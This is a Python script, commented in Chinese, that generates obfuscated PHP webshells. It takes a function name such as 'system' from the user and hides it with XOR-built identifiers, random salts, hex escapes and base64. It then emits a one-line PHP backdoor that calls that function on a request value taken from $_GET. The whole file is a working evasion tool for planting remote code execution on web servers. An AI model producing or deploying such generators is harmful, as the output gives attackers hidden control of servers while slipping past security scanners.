import base64
import random
import string
import sys

def RandomNumber():
    n1=random.randint(0,100)
    n2=0
    n3=0
    while True:
        n2=random.randint(0,1000)
        n3=random.randint(0,1000)
        if n1!=(n2+n3) and n1!=(n2-n3):
            break
    return n1,n2,n3


def GenerateRandomString(length):
    characters = string.ascii_letters
    return ''.join(random.choice(characters) for _ in range(length))


def ConvertToHex(s):
    # 從輸入字串中隨機選取一個字元的索引
    index = random.randint(0, len(s) - 1)
    # 從輸入字串中取得被選中的字元
    selected_char = s[index]
    # 將該字元轉換為十六進制表示形式
    hex_representation = "\\x{:02x}".format(ord(selected_char))
    return hex_representation, selected_char


def FuncConfuse(ss:str):
    payload=''
    prefix='<?php function/**/r($a){'
    a,b,c=RandomNumber()
    suffix=f"}}r(${{('!o'^'~(').('iz'^',.')}}[({a})!=({b}{['-','+'][random.randint(0,1)]}{c})]);?>"

    # 獲取長度為4的隨機字串
    salt=GenerateRandomString(4)
    # 隨機拿一個要替換的字索引
    RndLenSaltIndex=random.randint(1,len(ss)-2)
    RndLenSaltkey=ss[RndLenSaltIndex]
    
    # 將隨機生成的字串替換進去
    ss_salt=ss.replace(RndLenSaltkey,salt)
    
    # 將加料後的字串拆開兩個不等長度字串
    rnd_len=random.randint(1,len(ss_salt)-1)
    str1=ss_salt[:rnd_len]
    str2=ss_salt[rnd_len::]

    # str1 的處理
    rnd_len_str1=random.randint(1,len(str1)-2)
    str1_left =str1[:rnd_len_str1]
    str1_right=str1[rnd_len_str1::]

    TmpKeyToHex,TmpKeyToHexChar='',''
    if random.randint(0,1):
        TmpKeyToHex,TmpKeyToHexChar=ConvertToHex(str1_left)
        str1_left=str1_left.replace(TmpKeyToHexChar,TmpKeyToHex)
    else:
        TmpKeyToHex,TmpKeyToHexChar=ConvertToHex(str1_right)
        str1_right=str1_right.replace(TmpKeyToHexChar,TmpKeyToHex)

    # str2的處理
    str2_base64=base64.b64encode(str2.encode('ascii')).decode('ascii')
    return f"{prefix}@((',4K!DDS'^'_@9~6!#').('2VEW'^'^7&2'))('{salt}','{RndLenSaltkey}',\"{str1_left}\".\"{str1_right}\".(('9jfWW'^'[+52a').('OzQA9'^'{{%5$z').('^Ik'^'1-.'))('{str2_base64}'))($a);{suffix}"


def main(argv):
    func_name=input('function name: ') if len(argv) < 2 else argv[1]
    if len(func_name)<4:
        print('function name length <4  :-(')
        exit(0)
    while True:
        try:
            print(FuncConfuse(func_name))
            break
        except:
            continue


if __name__ == '__main__':
    main(sys.argv)